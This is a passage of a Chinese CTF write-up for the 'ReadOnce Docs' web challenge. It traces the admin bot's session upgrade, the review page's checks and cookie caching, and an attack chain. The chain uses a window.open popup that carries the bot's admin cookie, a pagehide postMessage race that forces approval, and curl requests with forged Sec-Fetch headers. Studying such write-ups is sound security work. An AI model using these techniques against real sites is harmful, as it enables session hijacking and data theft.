await sessionPage.setExtraHTTPHeaders({ "X-Bot-Token": BOT_TOKEN });   // ① 给请求附加请求头 X-Bot-Token（不是 cookie；服务器凭这个头认证机器人）
await sessionPage.goto(`${APP_URL}/reports/session`);                  // ② 访问升级接口（成功时响应带 Set-Cookie: sid=...，此后由浏览器自动携带）
await sessionPage.close();                              // 关闭页面；cookie 仍留在 context 里（sid 的生效范围=设置它的主机+路径 /），后续同上下文页面自动携带

// 2. 主页面按固定顺序做四步
const page = await context.newPage();                   // 主页面：以下四个访问动作都在它上面执行（与用完即关的 sessionPage 相对）

// 本地复现版添加的事件钩子（原版没有这段）：把该页面的以下事件打印到服务器日志
const hookPage = (pg, tag) => {
  pg.on("console", (m) => console.log(`[bot-console:${tag}:${m.type()}]`, m.text().slice(0, 300)));   // [bot-console:main:...] 行的来源
  pg.on("pageerror", (e) => console.log(`[bot-pageerror:${tag}]`, String(e).slice(0, 300)));
  pg.on("request", (r) => console.log(`[bot-req:${tag}]`, r.method(), r.url().slice(0, 140)));         // [bot-req:main] 行的来源
  pg.on("requestfailed", (r) => console.log(`[bot-reqfail:${tag}]`, r.url().slice(0, 140), r.failure() && r.failure().errorText));
  pg.on("framenavigated", (f) => console.log(`[bot-frame-nav:${tag}]`, f.url().slice(0, 140)));        // [bot-frame-nav:main] 行的来源
  pg.on("popup", (pp) => hookPage(pp, tag + "+popup"));                                                // 弹窗同样挂钩子（日志里的 main+popup）
  pg.on("dialog", async (d) => { console.log(`[bot-dialog:${tag}]`, d.message().slice(0, 100)); await d.dismiss(); });
};
hookPage(page, "main");                                 // 调用：日志里的 [bot-*:main] 行从这行开始生效

await page.goto(`${APP_URL}/reports/check?rid=${report.id}&state=${report.nonce}`);   // 访问审查页（rid、state 即上面生成的两个值）
await page.goto(`${APP_URL}/api/flag`);                    // flag 载入内存
await fetch(`${APP_URL}/reports/arm/${report.id}`, ...);   // 调用就绪接口：置 prepared（程序直接发请求，不经浏览器）
await page.goto(url);                                      // url 是你提交的，bot 会附加 rid 参数
await sleep(10000);                                        // 停留 10 秒
```

**会话升级的机制（`/reports/session`）**

一句话总结：机器人用口令向 `/reports/session` 换取一个管理员会话：服务器把该浏览器的会话数据标记为 `admin: true`；此后这个浏览器的每个请求都自动带会话 ID，服务器凭它查出数据、判断是否为管理员，再决定放行还是拒绝。细节分三步：会话怎么存、升级怎么发生、会话怎么被后续请求使用。

服务器用 `express-session` 库管理会话，工作方式分两部分：**服务器端存会话数据**。本题用 MemoryStore，即服务器进程内存里的一个键值表：键是随机的**会话 ID**，值是这份会话的数据（比如 `{ name: "reviewer", admin: true }`）。**浏览器端只拿会话 ID**，它存在 cookie `sid` 里。这个 cookie 带两个属性：`HttpOnly`（网页脚本无法读取它，它只能随请求自动发送）和 `SameSite=Lax`。此后浏览器每次请求都带上这个 ID，服务器凭它在存储里查出对应的数据，就知道这个请求属于哪个会话、是不是管理员。

数据写入存储的时机：请求处理过程中对 `req.session` 的修改是普通的内存对象操作；**响应发送完成时**，express-session 把会话数据序列化后写回 store。之后 `req.session` 对象随请求一起释放，数据则留在 store 里（本题的 store 是 memorystore：服务器进程内存里的一个带过期机制的结构，键是会话 ID）。下次同一会话的请求会重新读取它，挂到新请求的 `req.session` 上。进程重启（或条目过期）后数据消失。

新建与复用：中间件处理每个请求时先看 cookie。请求带 `sid`（且 store 里有对应数据）时复用那份会话；没有 `sid` 时新建一份会话、生成新 ID，并通过响应头 `Set-Cookie: sid=...` 下发给浏览器。机器人那次访问 `/reports/session` 属于后者（它的浏览器上下文此前没有 `sid`），所以是"新建会话并拿到 `sid`"。

默认情况下谁都没有管理员身份（代码里叫 `admin`）；唯一的升级方式是：

```js
app.get("/reports/session", (req, res) => {
  if (req.get("x-bot-token") === BOT_TOKEN) {   // ③ 校验：请求头 == 本进程的 BOT_TOKEN
    req.session.name = "reviewer";
    req.session.admin = true;                   // ④ 通过：把这个会话标记为管理员
  }
  ...
});
```

请求头里带上正确的机器人令牌（部署时配置的环境变量 `BOT_TOKEN`），这个会话就变成管理员。两段代码的对应关系：① 与 ② 是机器人端给请求带上令牌后请求服务端；③ 与 ④ 是服务器端的令牌校验和标记管理员：一次请求、一次比较、一次写入。机器人程序启动后第一件事就是访问这个接口，用令牌把自己的会话升级成管理员权限。攻击者不知道这个令牌（它由部署时的环境变量 `BOT_TOKEN` 配置），但**机器人升级好的会话会留在机器人的浏览器里**，本质是会话升级和后面的goto访问后端接口用的都是同一个`context`对象，所以后面所有页面都带着它。

这个值的强度还决定一条捷径是否存在：如果它被猜到或泄漏（例如沿用了源码里的默认值 `dev-token`），攻击者可以直接带 `X-Bot-Token` 请求 `/reports/session` 把自己的会话升级成管理员，随后在任意一轮审查进行期间直接读 `/api/flag`，本文其余的链全部可以跳过。因此部署要求强随机值（远程实例即如此）。本地复现的配置里，`BOT_TOKEN` 写的是明文测试值 `local-bot-token`（注意这里的"测试值"指机器人口令，不是 flag；flag 在本地是 compose 里配置的占位字符串，由攻击链按与远程相同的方式读走）。攻击链按"攻击者不知道令牌"构造：拿 flag 的完整链（弹窗批准、历史回退、渲染 XSS）不涉及这个值；复现脚本里唯一用到它的一步是调试残留（给脚本自己的浏览器升级会话，与拿 flag 无关），实测把该步骤去掉后完整链照样成功取得 flag。

`SameSite=Lax` 这条属性很关键，它规定：**跨站请求默认不带 cookie，但顶层导航（打开新页面）例外**。也就是说，攻击者网页里用 `fetch` 直接请求挑战域的 `/api/flag` 是带不上 cookie 的；但用 `window.open`、`location.href` 跳到挑战域的地址，cookie 会带上。

**就绪接口的机制（`/reports/arm/:id`）**

```js
app.post("/reports/arm/:id", requireBot, (req, res) => {   // requireBot是一个函数，用于 校验请求头 X-Bot-Token（不匹配则 403）
  // 404：id 不符或本轮已消费，这个 id 是调用 `/report` 时候生成的审查编号；used：笔记(note)被原样渲染过，`/reports/check`里面调用的 consumeReport 函数会设置它
  if (!currentReview || currentReview.id !== req.params.id || currentReview.used) {
    res.status(404).type("text/plain").send("not found");
    return;
  }
  currentReview.prepared = true;                      // 置“已就位”（渲染分支必查项）
  res.type("text/plain").send("ok");
});
```

所以从点 Send 到收到响应的耗时 ≈ 浏览器准备时间（耗时极短）+ 主页面四个访问动作的前三项耗时（耗时极短）+ **固定停留 10 秒** + 收尾。后面攻击链能利用的时间窗，正是这段停留期。

#### 2.5.4 实际执行

**实际执行一轮**：请求会挂起约 10 秒（机器人在工作，原因见本节前文），随后返回 Reviewed 结果页：

```text
HTTP/1.1 200 OK
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
Origin-Agent-Cluster: ?1
Referrer-Policy: no-referrer
Strict-Transport-Security: max-age=15552000; includeSubDomains
X-Content-Type-Options: nosniff
X-DNS-Prefetch-Control: off
X-Download-Options: noopen
X-Frame-Options: SAMEORIGIN
X-Permitted-Cross-Domain-Policies: none
X-XSS-Protection: 0
Content-Type: text/html; charset=utf-8
Content-Length: 469
ETag: W/"1d5-sH+WynRnxQza5WHc26M2qLu1koY"
Date: Sat, 19 Sep 2026 07:55:09 GMT
Connection: keep-alive
Keep-Alive: timeout=5

<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Reviewed | ReadOnce Docs</title>
  <link rel="stylesheet" href="/style.css">
</head>
<body>
  <main>
    <header>
      <div>
        <h1>ReadOnce Docs</h1>
        <p class="muted">Oi, make your notes, yeah?</p>
      </div>
      <a href="/">Dashboard</a>
    </header>

    <p>The reviewer finished.</p>
  </main>
</body>
</html>
```

**同时刻的服务器日志**

读之前先明确这些行是谁打印的，以及为什么只有这几行。

这些行在**服务器进程**里输出（`docker logs` 可见），但记录的内容是"主页面"的事件。"主页面"的定义：bot.js 用 `context.newPage()` 新建、承载四个访问动作的那个页面（即上面代码块里 `const page` 的那一行；它和用完即关的 `sessionPage` 是两个不同页面）。bot.js 给这个页面挂了事件钩子（`hookPage(page, "main")`），钩子把该页面的请求、导航、console 逐条打印出来（原始附件没有这些代码，是本地复现时加的插桩，第六章有观察方法）。

日志只包含主页面上的动作，因此以下两处不会出现在日志里：会话升级在另一个临时页面（`sessionPage`）上完成；就绪接口是进程内的 `fetch`，不属于任何页面。这两步下面流程表会补全。

`rid`、`state` 是上面处理代码里生成的两串值（`id` 与 `nonce`）进入 URL 后的名字；`secSite`、`secDest` 是服务器打印的请求头取值，用途见 2.6 检查 4。日志内容：

```text
[bot-req:main] GET http://localhost:3000/reports/check?rid=0802aeb88926b1cc2755b8d3&state=bd768ba879ac1f1819d0bfcab4bd6b4c
[check-debug] rid=0802aeb8 admin=true secSite=none secDest=document visited=false
[bot-frame-nav:main] http://localhost:3000/reports/check?rid=0802aeb88926b1cc2755b8d3&state=bd768ba879ac1f1819d0bfcab4bd6b4c
[bot-req:main] GET http://localhost:3000/api/flag
[bot-frame-nav:main] http://localhost:3000/api/flag
[bot-req:main] GET http://host.docker.internal:9975/stage1?note=c350151803f0f8f3d507&rid=0802aeb88926b1cc2755b8d3
[bot-frame-nav:main] http://host.docker.internal:9975/stage1?note=c350151803f0f8f3d507&rid=0802aeb88926b1cc2755b8d3
```

（后续：沙箱加载、批准、挤出、第二次访问、外传，全部发生在同一个 10 秒窗口内，逐段见 2.9 起各节与第五章的脚本。）

#### 2.5.5 从创建笔记到机器人收工梳理

从创建笔记到机器人收工，涉及的人和请求如下（自上而下是一条完整时间线）：

| # | 谁在发起 | 动作 | 端点与参数 | 源码位置 / 备注 |
|---|---|---|---|---|
| 1 | 你的浏览器 | 创建笔记 | `POST /create`（表单字段 `title`、`html`） | `const id = randomId(10)` 生成编号；响应 `Location: /note/<编号>`（详见 2.2、2.3 节） |
| 2 | 你的浏览器 | 打开预览页 | `GET /note/:id`（路径参数 `req.params.id`） | 预览页不读查询参数：`note` 加在这里也会被忽略；预览路由只按路径参数 `req.params.id` 取数 |
| 3 | 你的浏览器 | 提交审查（点 Send） | `POST /report`（请求体字段 `url`，其中含 `?note=<编号>`） | 服务器取出 `target.searchParams.get("note")`，存成 `currentReview.noteId`；页面从此挂起（note 的用途见本节前文） |
| 4 | 机器人浏览器 | 准备：把会话升级为管理员 | `GET /reports/session`（请求头 `X-Bot-Token: <机器人口令>`） | 服务器执行 `req.session.admin = true`（把该会话的数据改为管理员）；会话 ID 的 cookie 留在机器人浏览器里，后续请求自动带上（会话机制见本节前文） |
| 5 | 机器人浏览器 | 访问审查页 | `GET /reports/check?rid=&state=` | 首访只标记 `visited=true`、发放 view cookie、返回占位页。**渲染发生在二访**：那时用 `notes.get(currentReview.noteId)` 取回第 1 行的笔记，交给 `review-document` 模板输出（2.6 详讲两个分支） |
| 6 | 机器人浏览器 | 访问 flag 接口 | `GET /api/flag` | 一个 JSON 接口，被机器人"整页打开"；flag 写进 `currentReview.flag`（2.11 讲它的用法） |
| 7 | **服务器进程内的 fetch**（JavaScript 发 HTTP 请求的内置函数） | 调用就绪接口 | `POST /reports/arm/:id`（请求头 `X-Bot-Token`） | 置 `prepared=true`；这一步不经浏览器（机制见本节前文） |
| 8 | 机器人浏览器 | 打开提交的网址（stage1） | `GET http://host.docker.internal:9975/stage1?note=<编号>&rid=<rid>` | 机器人自动追加 `&rid=`；打开后停留 10 秒（它的两段动作分别在 2.9 与 2.10 分解） |
| 9 | 你的浏览器 | 收到响应 | （无） | 显示 "The reviewer finished." |

第 3 到第 8 行是同一轮审查的时间线：你的浏览器只参与第 1、2、3、9 行；第 4 到第 8 行全部发生在服务器内部拉起的无头 Chromium 里（第 7 行甚至不经浏览器），所以你在自己的浏览器和网络面板里看不到它们。

注意上面的流程表第 8 行（机器人打开提交的网址）：**你提交什么网址，机器人的主页面就会整页打开什么网址**。这是攻击者的第一个立足点。

### 2.6 审查页的两次访问

这一节无法通过你的浏览器打开网页并操作：用你的浏览器直接打开审查页地址只会得到 403，因为你的浏览器没有管理员身份（`admin` 会话是第一道检查，也正是整条攻击链要"借"的东西）。下面用 curl 模拟不同身份的访问者。

一句话机制：这一页要被访问两次才完整：第一次只做标记并返回占位页，第二次通过全部检查后渲染笔记原文。机器人自己只访问第一次；第二次是攻击链要制造的。

审查页 `/reports/check` 是本题最核心的路由。源码的流程由一条 `if (currentReview.visited)` 分成两段，下文分别称为**渲染分支**（条件成立时执行：渲染笔记原文）和**标记分支**（条件不成立时执行：标记已访问、下发 `view` cookie、返回占位页）。这两个名字是本文对两段代码的称呼，源码中并没有它们。完整源码如下（`src/server.js`，注释标出了每项检查对应的代码）：

```js
app.get("/reports/check", (req, res) => {
  res.setHeader("Vary", "Cookie");  // 响应缓存按 cookie 分变体（配合 view cookie，见下文说明）

  if (!req.session.admin) {                                           // 检查 1：admin 会话
    res.status(403).type("text/plain").send("forbidden");
    return;
  }

  const id = String(req.query.rid || "");
  if (!currentReview || currentReview.id !== id) {                    // 检查 2：rid 匹配
    res.status(404).type("text/plain").send("not found");
    return;
  }

  if (currentReview.visited) {
    // ===== 渲染分支 =====
    const note = notes.get(currentReview.noteId);                     // 检查 3：笔记存在
    if (!note) {
      res.status(404).type("text/plain").send("not found");
      return;
    }

    if (!policy(req) || !consumeReport(req)) {                        // 检查 4 + 检查 5 到 8
      res.status(403).type("text/plain").send("forbidden");
      return;
    }

    res.render("review-document", { note });                          // 全部通过：不转义原样输出笔记 HTML
    return;
  }

  // ===== 标记分支 =====
  currentReview.visited = true;
  res.cookie("view", id, { httpOnly: true, sameSite: "lax", path: "/reports/check" });  // 下发 view cookie：值=id；生效范围 Path=/reports/check
  res.type("html").send("<!doctype html><title>Reviewer</title><p>Opening document.</p>");
});
```

检查 4 到 8 展开在两个辅助函数里：

```js
function policy(req) {                              // 检查 4：Fetch Metadata
  return Object.entries({
    "sec-fetch-site": "none",
    "sec-fetch-dest": "document",
  }).every(([header, expected]) => req.get(header) === expected);
}

function consumeReport(req) {
  const id = String(req.query.rid || "");
  const state = String(req.query.state || "");

  if (
    !currentReview
    || currentReview.id !== id        // 再次确认 rid 与当前审查一致
    || state !== currentReview.nonce  // 检查 5：state 匹配
    || !currentReview.prepared        // 检查 6：机器人已就位
    || !currentReview.approved        // 检查 7：审查已批准
    || currentReview.used             // 检查 8：未被使用过
  ) {
    return false;
  }

  currentReview.used = true;          // 通过后立即置 true，同一轮审查不能再次渲染
  return true;
}
```

对这段源码的三点补充：

1. **执行顺序**：检查 1、2 在路由开头，任何请求都要先过；之后按 `visited` 分流。渲染分支里检查 4 与 5 到 8 写在同一条 `if` 里，`||` 短路求值：`policy` 不满足就直接 403，不再执行 `consumeReport`；`consumeReport` 内部同样是逐项短路。
2. **404 与 403 的分工**：编号对不上（检查 2）、笔记不存在（检查 3）返回 404（"目标不存在"）；身份或条件不满足（检查 1、4 到 8）返回 403（"目标存在但不允许"）。这也是给攻击者的信号：404 说明 rid 不对，403 说明 rid 对了但后面某项没满足。
3. **`used` 与其它检查的性质不同**：其它检查只读取状态；`used` 在通过后会被立即置为 true（`consumeReport` 里 `return true` 之前），作用是同一轮审查的渲染只能发生一次。

**第一次访问（标记分支）**

- 返回一个占位页，同时设置 `view` cookie、把 `visited` 置为 true。两个数据的存放位置与作用都不同：
  - `visited` 是**服务器端**字段（`currentReview` 对象的属性，存在服务器进程内存里），它决定第二次访问走哪个分支；
  - `view` cookie 存在浏览器里（首次访问的响应设置它）；它的作用和两个机制在 2.7 讲。

**第二次访问（渲染分支）**

源码里 `if (currentReview.visited)` 成立时执行的就是渲染分支。它的流程：先通过下面全部检查，然后 `notes.get(currentReview.noteId)` 取出提交时指定的那篇笔记，执行 `res.render("review-document", { note })` 把笔记 HTML **原样渲染进响应**（渲染模板 `review-document.ejs` 的关键内容只有一行 `<%- note.html %>`；这个响应没有任何 CSP）。

检查缺一不可：

| 检查 | 含义 | 数据来源 |
|---|---|---|
| `admin` 会话 | 访问者必须是管理员 | 机器人会话的 cookie |
| `rid` 匹配 | 审查编号对得上 | 网址参数（产生与作用见 3.3） |
| 笔记存在 | 提交网址里的 `note` 参数能查到笔记 | `POST /report` 时从提交网址提取并存入 |
| `policy` | 请求头 `Sec-Fetch-Site: none` 且 `Sec-Fetch-Dest: document` | 这对请求头属于 Fetch Metadata（浏览器自动附加、标明请求来源的一组 `Sec-Fetch-*` 头，脚本伪造不了），只有"浏览器自己发起"的导航才会带 |
| `state` 匹配 | 与服务器生成的 `nonce` 一致 | 网址参数 |
| `prepared` | 机器人已就位 | 机器人调用就绪接口时自动置位（机制见 2.5） |
| `approved` | 审查已批准 | `/complete` 接口置位（3.2 详讲） |
| 未使用过 | 防止二次消费 | 服务器状态 |

用 curl 手工访问即可看到这两项最容易观察的检查。先取一个管理员会话模拟机器人视角：`curl -si http://localhost:3000/reports/session -H "X-Bot-Token: local-bot-token"`，把响应里的 `sid` cookie 记作 `$ADMIN_COOKIE`；rid/state 从容器日志里抄。然后依次发两个请求：

```bash
# 第一次：裸 curl 不带任何 Sec-Fetch 头（浏览器内脚本发起的请求同样过不了这一关）
curl -si "http://localhost:3000/reports/check?rid=8d7b1188c0a93a59c69788b8&state=ff7a36206365358196fc446658cc4000" \
  -H "Cookie: $ADMIN_COOKIE"
# 服务端日志：[check-debug] 2nd-visit note=true policy=false stateOK=true prepared=true approved=false used=false
# HTTP/1.1 403 Forbidden

# 第二次：伪造 Sec-Fetch-Site: none + Sec-Fetch-Dest: document，并带上机器人首访时拿到的 view cookie（值就是 rid）
curl -si "http://localhost:3000/reports/check?rid=8d7b1188c0a93a59c69788b8&state=ff7a36206365358196fc446658cc4000" \
  -H "Cookie: $ADMIN_COOKIE; view=8d7b1188c0a93a59c69788b8" \
  -H "Sec-Fetch-Site: none" -H "Sec-Fetch-Dest: document"
# 服务端日志：[check-debug] 2nd-visit note=true policy=true stateOK=true prepared=true approved=false used=false
# HTTP/1.1 403 Forbidden
```

第二次访问里 `policy` 已经通过，`prepared` 也已就位，唯一卡住的是 `approved=false`。**这个字段由谁能置位、怎么置位，就是整条攻击链的主线**。

### 2.7 附：`view` cookie 的发送与缓存机制

2.6 的第一次访问里，服务器下发了一条 `view` cookie。本节说明它的两个机制：它随哪些请求发送（cookie 的 `Path` 属性），以及它为什么能保证第二次访问不被 HTTP 缓存截走（响应头的 `Vary: Cookie`）。


基本信息：值就是审查编号（源码 `res.cookie("view", id, ...)` 里的 `id`；`id` 与 `rid` 是同一个值，见 3.3）；只随 `/reports/check` 路径的请求发送。"发送"和"读取"是两个不同动作：它随请求被送到服务器（HTTP 机制决定的），但**真正读取并使用它的，是浏览器内部的缓存模块**（读取时机在请求发出之前，见机制二）；**服务器代码不读取它**（本地复现版的插桩日志会打印整个 Cookie 头原文，那也只是打印输出，不涉及读取逻辑）。它涉及两个机制，都关系到"第二次访问"能否顺利进行。

先分清两个名字相近的 HTTP 头（cookie 机制里最容易混的一对）：

- **`Set-Cookie`**：**响应头**（服务器 → 浏览器）。服务器用它向浏览器**下发**一条 cookie（名字、值、属性都写在这里）。
- **`Cookie`**：**请求头**（浏览器 → 服务器）。浏览器用它向服务器**携带**已保存的 cookie。

本题的接力：第一次**响应**用 `Set-Cookie` 把 `view` 交给浏览器保存（此前浏览器没有这条 cookie，第一次请求的 `Cookie` 头里自然也没有它）；从第二次**请求**开始，浏览器用 `Cookie` 头把它带上（且只在路径匹配时，见机制一）。

**机制一：控制它随哪些请求发送（cookie 的 `Path` 属性）**

服务器代码：

```js
res.cookie("view", id, { httpOnly: true, sameSite: "lax", path: "/reports/check" });
```

这行代码写在**标记分支**里，而标记分支只在**本轮审查的第一次** `/reports/check` 请求时执行（该请求进来时 `currentReview.visited` 还是 false；执行完它就被置为 true）。因此 `Set-Cookie` 只会出现在那一次的响应里，第二次及以后走渲染分支、不再执行这行。第一次请求（发起者是机器人访问审查页的那次请求，见 2.5 流程表第 5 行）的**响应头**里会出现这样一行：

```text
Set-Cookie: view=8d7b1188c0a93a59c69788b8; Path=/reports/check; HttpOnly; SameSite=Lax
```

浏览器收到后把这条 cookie 保存起来，保存内容：名字 `view`、值 `8d7b1188...`、`Path=/reports/check`、`HttpOnly`、`SameSite=Lax`。

之后每次发请求前，浏览器筛选要附带的 cookie（此动作由浏览器按 HTTP 标准执行，服务器不参与），筛选条件之一是比较请求路径与 cookie 的 `Path`：

```text
请求 GET /reports/check?rid=...  → 路径 /reports/check 与 Path 相同 → 附带：Cookie: view=8d7b1188...
请求 GET /api/flag               → 路径 /api/flag 与 Path 不同     → 不附带 view
```

（HTTP 标准规定 cookie 的 `Path` 属性决定其发送范围；服务器只能声明这个属性，浏览器决定每个请求实际附带哪些 cookie。）

**机制二：让第二次访问不被 HTTP 缓存截走**

先明确 HTTP 缓存是什么。它就是通常说的浏览器"网页缓存"：

- **保存什么**：`GET` 请求的**响应**本身（状态码 + 响应头 + 响应体内容）。不限定内容类型（HTML 文档、CSS 文件、图片都算），也不限定发起者：页面跳转、`fetch`、图片/脚本加载等任何来源的 `GET` 请求，都进入同一套 HTTP 缓存体系；是否真的保存与复用由响应头（`Cache-Control`、`Vary` 等）和浏览器实现决定。本题涉及的具体对象是 `/reports/check` 那条页面跳转请求的 HTML 响应（占位页）。同一套规则也作用于 API：返回 JSON 的 `GET` 接口若带了允许缓存的响应头（如 `Cache-Control: max-age=300`），浏览器同样会缓存它，并在有效期内直接使用本地副本、不向服务器发请求（过期后则发条件请求，服务器回 304 时继续用本地副本）；因此不希望被缓存的接口通常显式返回 `Cache-Control: no-store`。
- **怎么用**：之后浏览器再遇到请求时，先检查本地保存的记录；若判断"某份保存的响应可以使用"，就直接使用它、**不再发出网络请求**（这个动作叫"复用"）。判断条件由 HTTP 标准规定，其中一部分来自响应头（本题用到的是 `Vary: Cookie`，见下）。

把这个机制放到本题的两次访问上，按发生顺序走一遍。

**第一步：第一次访问的响应被保存时，缓存模块多记了一个字符串。**

第一次访问 `/reports/check` 的响应头里有两行关键内容（都来自服务器代码）：`Vary: Cookie`（源码 `res.setHeader("Vary", "Cookie")`）和 `Set-Cookie: view=8d7b1188...`（下发 cookie）。

HTTP 标准规定：响应里出现 `Vary` 时，缓存模块保存这条响应必须**额外记录一个字符串**。先看 `Vary` 这行的结构，三层要分清：它本身是**响应头**（写在服务器发出的响应里）；它的**值是一批请求头的名字**（本例 `Vary: Cookie`，也可以写多个名字）；作用是服务器在告诉缓存："以后判断这条响应能不能复用时，要一并考虑**请求**的这几个头。"之所以指向请求头，是因为复用判定发生在"新的请求"与"已存响应"之间，对比对象是请求头。

记录内容据此分两步取：① 从 `Vary` 的值得到请求头名字（此处 `Cookie`）；② 回到"生成这条响应的那次请求"里，取出该请求头的实际内容。本例记录的就是那次请求 `Cookie` 头的原文。保存下来的缓存条目形如：

```text
条目
├─ URL：/reports/check?rid=8d7b...&state=ff7a...
├─ 响应内容：占位页 HTML
└─ Vary 附加记录：Cookie 头 = "sid=s%3Aabc..."    ← 第一次请求的原文（当时还没有 view）
```

这个附加记录是一段**文本**，不是"一份 cookie"；缓存模块不解析它的内容，只负责记录与比较。

**第二步：第二次访问时，缓存模块比较两个字符串，决定这条缓存能不能用。**

第二次请求发出前，缓存模块要回答"本地保存的占位页响应能不能直接使用"，检查分两级：

```text
① URL 比较：新请求 URL 与条目 URL 相同 → 通过
   （如果没有 Vary: Cookie，检查到此为止、允许直接复用这条缓存）
② Cookie 头比较（条目带 Vary: Cookie 才会做）：两个字符串是否完全相同：
     条目里记录的：  "sid=s%3Aabc..."
     新请求携带的：  "sid=s%3Aabc...; view=8d7b1188..."
     结果：不相同 → 这条缓存条目不可用 → 请求真的发到服务器
```

第二步里的"新请求携带的"为什么多出 `view`：第一次响应里的 `Set-Cookie: view=...` 把它存进了浏览器的 cookie 存储，浏览器之后会按 cookie 规则自动附带它（机制一）。于是②的比较结果必然"不相同"，第二次访问必然到达服务器。

两个条件缺一不可：没有 `Vary: Cookie`，②不会发生（检查停在①，缓存被直接复用）；没有 `view`，②的比较结果会是"相同"（两次请求头一样），缓存同样被复用。

（同一 URL 下按这个条件分开保存的各份响应，缓存术语叫不同"变体"；`Vary: Cookie` 就是"按 `Cookie` 头分变体"。）

最后澄清两种数据的位置（容易混）：同一个 `view` 的值出现在两个用途不同的地方：cookie 存储里是它的定义（决定以后的请求带不带这个 cookie）；缓存条目里是历史快照（某次请求 `Cookie` 头的原文，决定条目能不能复用）。两个机制本来互不相关，是服务器的 `Vary: Cookie` 这一行把 `Cookie` 头指定为缓存的匹配条件，两者才产生联系；缓存模块不解析 cookie 的含义（身份、会话等）。

最后区分另一套缓存机制：上面讲的是 HTTP 缓存（保存的是响应内容）；2.10 讲的 BFCache 保存的是整个页面的内存快照，是独立机制，两者都会"跳过服务器"，本题的防线与攻击链对它们分别处理。


### 2.8 攻击计划：八项检查与四个问题

目标：读取 `/api/flag` 的响应内容。直接请求必然失败（没有管理员身份），所以目标等价于"让笔记 HTML 在渲染分支里被渲染出来"（那是全站唯一不加防护的输出点）。

渲染分支要过八项检查（见 2.6 表格）。把它当成一张待办清单，逐项分析自己能不能满足：

| # | 检查项 | 攻击者视角 |
|---|---|---|
| 1 | admin 会话 | 没有。必须借机器人浏览器发起请求 |
| 2 | rid 匹配 | 知道。机器人打开提交网址时会追加 `rid`，页面脚本能读到 |
| 3 | 笔记存在 | 自己控制。创建笔记，把编号写进提交网址的 `note` 参数 |
| 4 | `policy`（Fetch Metadata） | 脚本请求伪造不了。需要"浏览器自己发起"的导航 |
| 5 | `state` 匹配 | 不知道（`nonce`）。但它出现在机器人第一次访问的审查页 URL 上 |
| 6 | `prepared` | 机器人自动完成，不用管 |
| 7 | `approved` | 初始 false。由 `/complete` 控制，需要绕过审查界面的校验逻辑 |
| 8 | `used` | 初始 false。它不是障碍：前七项都过之后，服务器在渲染的同时把它置 true |

由此得到四个必须解决的问题：

1. **注入问题**：怎么让自己的脚本进入机器人浏览器并打开审查界面（第 1 项）。
2. **批准问题**：怎么让审查界面调用 `/complete`（第 7 项）。
3. **时机问题**：怎么发起"第二次访问"，并且让这次访问带上正确的 rid/state（第 2、4、5 项）。
4. **外传问题**：渲染出的 XSS 怎么把 flag 带走（第 3 项由攻击者控制；其余是执行细节）。

对应关系：**注入问题**分两步完成（2.5 提交 stage1 让脚本进入机器人浏览器，2.9 开头借机器人身份打开审查界面）；其余三个问题的解决分别在 2.9、2.10、2.11。


### 2.9 批准：弹窗与 pagehide 竞态

2.5 停在这里：机器人打开了 stage1（该轮日志的最后一行），并开始 10 秒停留。stage1 页面里的第一段 JS 立即执行（见 2.5 前置块的代码）：弹窗打开审查界面；第二段 3.5 秒后才开始（2.10 讲）。本节按顺序：弹窗 → 沙箱加载 → pagehide 竞态 → `/complete`。

先说清为什么弹窗是关键：stage1 运行在攻击者的源（例如 `http://host.docker.internal:9975`），**不是挑战域**。它不能直接 `fetch("http://localhost:3000/api/flag")`，因为跨站请求不带 `SameSite=Lax` 的 cookie，服务器会返回 403；直接 `fetch` 审查界面也不行（同类问题）。

突破点是 Lax 的例外规则：**顶层导航会携带 cookie**。于是 stage1 里执行：

（下面这段是示意，实际代码即 2.5 前置块里 stage1 页面的第一段 JS。）

```js
const rid = new URLSearchParams(location.search).get("rid");   // 机器人追加的 rid
// 攻击脚本地址形如 http://host.docker.internal:9975/s2p.js（2.4 前置块里 S2 的下发地址）
window.open("http://localhost:3000/review?u=" + 攻击脚本地址 + "&rid=" + rid, "REV");
```

这个弹窗是一次顶层导航，机器人浏览器会带上自己的管理员 cookie，请求到达挑战域时身份就是管理员。`/review` 的两项检查（admin、rid 匹配）同时满足，审查界面成功打开，攻击脚本地址（即 2.5 前置块里的 `/s2p.js`）被登记为待审查文档。

审查界面打开后，其中的沙箱 iframe（带 `sandbox` 属性限制的嵌入子页面：允许执行脚本，但不给它任何同源权限）会加载 `/sandbox?rid=...`，服务器用带 nonce 的 script 标签加载攻击脚本。至此，攻击脚本在审查页面内部的沙箱 iframe 里开始运行。

需要注意的是，这个弹窗只是攻击链的一环：它是注入问题的收尾（攻击脚本由此进入挑战域的沙箱）。主页面还有另一条并行的线（时机问题），2.10 讲。

接下来是让审查界面调用一次 `/complete` 的环节。它的防线基于"消息来源 = 当前 iframe 窗口"的比较，而 iframe 被替换的瞬间恰好能打破这个比较。

回到审查界面的消息处理逻辑（3.2 节源码）：

```js
addEventListener("message", (e) => {
  if (!closing || e.source === viewer.contentWindow) return;   // 校验条件
  fetch("/complete", ...);                                     // 批准
});
```

两个条件必须同时成立：`closing === true`（iframe 第一次加载已完成）且 `e.source !== viewer.contentWindow`（消息来源不是当前 iframe 窗口）。

正常时序下，这两个条件没有同时成立的机会：

- iframe 内的脚本刚运行就发消息（此时 load 还没完成）：`closing` 还是 false，被第一条拦掉；
- iframe 加载完成（`closing` 变 true）之后：`viewer.src` 立刻被替换成空文档，脚本已被卸载，没有机会再发消息。

唯一的时间窗在**旧文档卸载的瞬间**。页面被导航替换时，浏览器会让旧文档在卸载前执行最后一次 JavaScript（`pagehide` 事件：页面即将被替换或关闭时触发的最后一个事件）。此时 `closing` 已经为 true，而消息的来源指向正在卸载的旧文档窗口；审查页读取 `viewer.contentWindow` 时，拿到的已经是接管的新文档窗口。两者不相等，身份比较失效。

用两个实验对照验证（修改攻击脚本，其余流程不变）：

**对照一：加载即发消息**（脚本第一行直接 `top.postMessage`，不等 pagehide）：

```text
REVIEW-MSG source-is-viewer=true closing=false data={"p":1}
```

两个条件全部不合格，`/complete` 从未被调用。后续步骤即使全部成功，第二次访问审查页也会因 `approved=false` 被 403 拦下。

**对照二：pagehide 时机发消息**（正式攻击脚本的写法）：

```js
addEventListener("pagehide", function () {
  try { top.postMessage({ p: 1 }, "*"); top.postMessage({ p: 2 }, "*"); } catch (e) {}
});
```

```text
REVIEW-MSG source-is-viewer=false closing=true data={"p":1}
